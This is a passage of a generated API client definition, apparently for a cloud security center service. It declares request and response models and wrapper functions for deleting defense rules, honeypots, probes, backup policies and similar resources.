  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupPolicyMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteBackupPolicyMachine(request: DeleteBackupPolicyMachineRequest): DeleteBackupPolicyMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupPolicyMachineWithOptions(request, runtime);
}

model DeleteClientUserDefineRuleRequest {
  idList?: [ long ](name='IdList', description='The IDs of the custom defense rules.'),
}

model DeleteClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4552b59b-18f2-4fad-b6a2-0d59b8f2****'),
}

model DeleteClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteClientUserDefineRuleResponseBody(name='body'),
}

async function deleteClientUserDefineRuleWithOptions(request: DeleteClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): DeleteClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteClientUserDefineRule(request: DeleteClientUserDefineRuleRequest): DeleteClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteClientUserDefineRuleWithOptions(request, runtime);
}

model DeleteCustomBlockRecordRequest {
  id?: long(name='Id', description='The ID of the record that you want to delete.

> You can call the [DescribeCustomBlockRecords](~~DescribeCustomBlockRecords~~) operation to query the ID.', example='381**'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DeleteCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DeleteCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteCustomBlockRecordResponseBody(name='body'),
}

async function deleteCustomBlockRecordWithOptions(request: DeleteCustomBlockRecordRequest, runtime: Util.RuntimeOptions): DeleteCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteCustomBlockRecord(request: DeleteCustomBlockRecordRequest): DeleteCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCustomBlockRecordWithOptions(request, runtime);
}

model DeleteCycleTaskRequest {
  configId?: string(name='ConfigId', description='The ID of the task configuration.

>  You can call the [DescribeCycleTaskList](~~DescribeCycleTaskList~~) operation to query the IDs of task configurations.', example='435f626256ebf564cf5ba966a539****'),
}

model DeleteCycleTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7DBB3D54-AF29-5BF4-8B44-9CFA94F50****'),
}

model DeleteCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteCycleTaskResponseBody(name='body'),
}

async function deleteCycleTaskWithOptions(request: DeleteCycleTaskRequest, runtime: Util.RuntimeOptions): DeleteCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteCycleTask(request: DeleteCycleTaskRequest): DeleteCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCycleTaskWithOptions(request, runtime);
}

model DeleteGroupRequest {
  groupId?: long(name='GroupId'),
  sourceIp?: string(name='SourceIp'),
}

model DeleteGroupResponseBody = {
  code?: string(name='Code'),
  requestId?: string(name='RequestId'),
}

model DeleteGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteGroupResponseBody(name='body'),
}

async function deleteGroupWithOptions(request: DeleteGroupRequest, runtime: Util.RuntimeOptions): DeleteGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteGroup(request: DeleteGroupRequest): DeleteGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteGroupWithOptions(request, runtime);
}

model DeleteHoneypotRequest {
  honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='558b5fa40948ebe2171a74757c54dc7e58f761870fa7ee6a105e70947ec82aa9'),
}

model DeleteHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E14721CB-B32F-56F2-8490-CDA18E4F9268'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotResponseBody(name='body'),
}

async function deleteHoneypotWithOptions(request: DeleteHoneypotRequest, runtime: Util.RuntimeOptions): DeleteHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypot(request: DeleteHoneypotRequest): DeleteHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotWithOptions(request, runtime);
}

model DeleteHoneypotNodeRequest {
  nodeId?: string(name='NodeId', description='The ID of the management node.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to obtain the IDs of management nodes.', example='670baeee-86c4-46b9-8200-a2c38141a453'),
}

model DeleteHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='49FDE92F-A0B8-56CC-B7A8-23B17646CCAD'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotNodeResponseBody(name='body'),
}

async function deleteHoneypotNodeWithOptions(request: DeleteHoneypotNodeRequest, runtime: Util.RuntimeOptions): DeleteHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotNode(request: DeleteHoneypotNodeRequest): DeleteHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotNodeWithOptions(request, runtime);
}

model DeleteHoneypotPresetRequest {
  honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.

>  You can call the [ListHoneypotPreset](~~ListHoneypotPreset~~) operation to query the IDs of honeypot templates.', example='84104b7b-a2bc-41df-a190-12298f99xxxx'),
}

model DeleteHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotPresetResponseBody(name='body'),
}

async function deleteHoneypotPresetWithOptions(request: DeleteHoneypotPresetRequest, runtime: Util.RuntimeOptions): DeleteHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotPreset(request: DeleteHoneypotPresetRequest): DeleteHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotPresetWithOptions(request, runtime);
}

model DeleteHoneypotProbeRequest {
  probeId?: string(name='ProbeId', description='The ID of the probe.

>  You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='95f0f79c-f7e9-4b09-a6e3-95a4cb6d****'),
}

model DeleteHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7FD1C1DC-AA67-510A-A022-5D23310C3658'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DeleteHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotProbeResponseBody(name='body'),
}

async function deleteHoneypotProbeWithOptions(request: DeleteHoneypotProbeRequest, runtime: Util.RuntimeOptions): DeleteHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotProbe(request: DeleteHoneypotProbeRequest): DeleteHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotProbeWithOptions(request, runtime);
}

model DeleteInstallCodeRequest {
  captchaCode?: string(name='CaptchaCode', description='The installation command.

>  You can call the [DescribeInstallCodes](~~DescribeInstallCodes~~) operation to query installation commands.', example='1q****'),
}

model DeleteInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model DeleteInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInstallCodeResponseBody(name='body'),
}

async function deleteInstallCodeWithOptions(request: DeleteInstallCodeRequest, runtime: Util.RuntimeOptions): DeleteInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.captchaCode)) {
    query['CaptchaCode'] = request.captchaCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInstallCode(request: DeleteInstallCodeRequest): DeleteInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInstallCodeWithOptions(request, runtime);
}

model DeleteInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', example='cdf629147cc3747d292a3f587xxxxxxxx'),
  ruleIds?: [ long ](name='RuleIds'),
}

model DeleteInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXXX'),
}

model DeleteInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInterceptionRuleResponseBody(name='body'),
}

async function deleteInterceptionRuleWithOptions(request: DeleteInterceptionRuleRequest, runtime: Util.RuntimeOptions): DeleteInterceptionRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInterceptionRule(request: DeleteInterceptionRuleRequest): DeleteInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInterceptionRuleWithOptions(request, runtime);
}

model DeleteInterceptionTargetRequest {
  targetIds?: string(name='TargetIds', example='1,11,111'),
}

model DeleteInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', example='D81DD78E-E006-5C65-A171-C8CB09XXXXX'),
  result?: boolean(name='Result', example='true'),
}

model DeleteInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInterceptionTargetResponseBody(name='body'),
}

async function deleteInterceptionTargetWithOptions(request: DeleteInterceptionTargetRequest, runtime: Util.RuntimeOptions): DeleteInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetIds)) {
    query['TargetIds'] = request.targetIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInterceptionTarget(request: DeleteInterceptionTargetRequest): DeleteInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInterceptionTargetWithOptions(request, runtime);
}

model DeleteLoginBaseConfigRequest {
  config?: string(name='Config', description='The configuration item that you want to delete. The items vary based on the type of logon configurations. Valid values:

*   **login\\_common_ip**: approved logon IP addresses

Example: {"ip":"10.23.23.23"}.

*   **login\\_common_time**: approved logon time ranges

Example: {"startTime":"06:00:00","endTime":"16:00:00"}.

*   **login\\_common_account**: approved logon accounts

Example: {"account":"test_account\\_001"}.

*   **login\\_common_location**: approved logon locations

Example: {"location":"Shanghai"}.', example='{"startTime":"06:00:00","endTime":"16:00:00"}'),
  target?: string(name='Target', description='The UUID of the server whose logon configurations you want to delete.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
  type?: string(name='Type', description='The type of logon configurations to delete. Valid values:

*   **login\\_common_ip**: approved logon IP addresses
*   **login\\_common_time**: approved logon time ranges
*   **login\\_common_account**: approved logon accounts
*   **login\\_common_location**: approved logon locations', example='login_common_time'),
}

model DeleteLoginBaseConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteLoginBaseConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteLoginBaseConfigResponseBody(name='body'),
}

async function deleteLoginBaseConfigWithOptions(request: DeleteLoginBaseConfigRequest, runtime: Util.RuntimeOptions): DeleteLoginBaseConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteLoginBaseConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteLoginBaseConfig(request: DeleteLoginBaseConfigRequest): DeleteLoginBaseConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteLoginBaseConfigWithOptions(request, runtime);
}

model DeletePrivateRegistryRequest {
  registryId?: long(name='RegistryId', example='22233'),
}

model DeletePrivateRegistryResponseBody = {
  data?: boolean(name='Data', example='true'),
  requestId?: string(name='RequestId', example='818E3B38-F018-50FF-9A85-5A521747****'),
}

model DeletePrivateRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeletePrivateRegistryResponseBody(name='body'),
}

async function deletePrivateRegistryWithOptions(request: DeletePrivateRegistryRequest, runtime: Util.RuntimeOptions): DeletePrivateRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryId)) {
    query['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeletePrivateRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deletePrivateRegistry(request: DeletePrivateRegistryRequest): DeletePrivateRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return deletePrivateRegistryWithOptions(request, runtime);
}

model DeleteSecurityEventMarkMissListRequest {
  ids?: [ long ](name='Ids'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DeleteSecurityEventMarkMissListResponseBody = {
  requestId?: string(name='RequestId', example='23AD0BD2-8771-5647-819E-6BA51E2XXXXX'),
}

model DeleteSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSecurityEventMarkMissListResponseBody(name='body'),
}

async function deleteSecurityEventMarkMissListWithOptions(request: DeleteSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): DeleteSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteSecurityEventMarkMissList(request: DeleteSecurityEventMarkMissListRequest): DeleteSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSecurityEventMarkMissListWithOptions(request, runtime);
}

model DeleteStrategyRequest {
  id?: string(name='Id'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model DeleteStrategyResponseBody = {
  requestId?: string(name='RequestId'),
}

model DeleteStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteStrategyResponseBody(name='body'),
}

async function deleteStrategyWithOptions(request: DeleteStrategyRequest, runtime: Util.RuntimeOptions): DeleteStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteStrategy(request: DeleteStrategyRequest): DeleteStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteStrategyWithOptions(request, runtime);
}

model DeleteSuspEventNodeRequest {
  noteId?: long(name='NoteId', example='123'),
}

model DeleteSuspEventNodeResponseBody = {
  code?: string(name='Code', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='A57C711B-AA15-55B2-8F61-4D09CEXXXXX'),
  success?: boolean(name='Success', example='true'),
}

model DeleteSuspEventNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSuspEventNodeResponseBody(name='body'),
}

async function deleteSuspEventNodeWithOptions(request: DeleteSuspEventNodeRequest, runtime: Util.RuntimeOptions): DeleteSuspEventNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.noteId)) {
    query['NoteId'] = request.noteId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSuspEventNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteSuspEventNode(request: DeleteSuspEventNodeRequest): DeleteSuspEventNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSuspEventNodeWithOptions(request, runtime);
}

model DeleteTagWithUuidRequest {
  tagName?: string(name='TagName'),
  uuidList?: string(name='UuidList'),
}

model DeleteTagWithUuidResponseBody = {
  requestId?: string(name='RequestId'),
}

model DeleteTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteTagWithUuidResponseBody(name='body'),
}

async function deleteTagWithUuidWithOptions(request: DeleteTagWithUuidRequest, runtime: Util.RuntimeOptions): DeleteTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteTagWithUuid(request: DeleteTagWithUuidRequest): DeleteTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteTagWithUuidWithOptions(request, runtime);
}

model DeleteUniBackupPolicyRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies. You must specify at least one of the PolicyId parameter and the **PolicyIds** parameter.', example='123'),
  policyIds?: string(name='PolicyIds', description='The IDs of anti-ransomware policies.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies. You must specify at least one of the **PolicyId** parameter and the PolicyIds parameter.', example='123,124'),
}

model DeleteUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4F07F4F1-88ED-5569-B519-FFCC9B7E****'),
}

model DeleteUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteUniBackupPolicyResponseBody(name='body'),
}

async function deleteUniBackupPolicyWithOptions(request: DeleteUniBackupPolicyRequest, runtime: Util.RuntimeOptions): DeleteUniBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyIds)) {
    query['PolicyIds'] = request.policyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteUniBackupPolicy(request: DeleteUniBackupPolicyRequest): DeleteUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteUniBackupPolicyWithOptions(request, runtime);
}

model DeleteVpcHoneyPotRequest {
  vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC) on which the honeypot is deployed.

> You can call the [DescribeVpcHoneyPotList](~~DescribeVpcHoneyPotList~~) operation to query the IDs of VPCs.', example='vpc-d7o009q63fqy21r8u****'),
}

model DeleteVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4347E985-6E64-467B-96EC-30D4EA9E32FB'),
}

model DeleteVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteVpcHoneyPotResponseBody(name='body'),
}

async function deleteVpcHoneyPotWithOptions(request: DeleteVpcHoneyPotRequest, runtime: Util.RuntimeOptions): DeleteVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteVpcHoneyPot(request: DeleteVpcHoneyPotRequest): DeleteVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVpcHoneyPotWithOptions(request, runtime);
}

model DeleteVulWhitelistRequest {
  id?: string(name='Id', description='The ID of the whitelist.

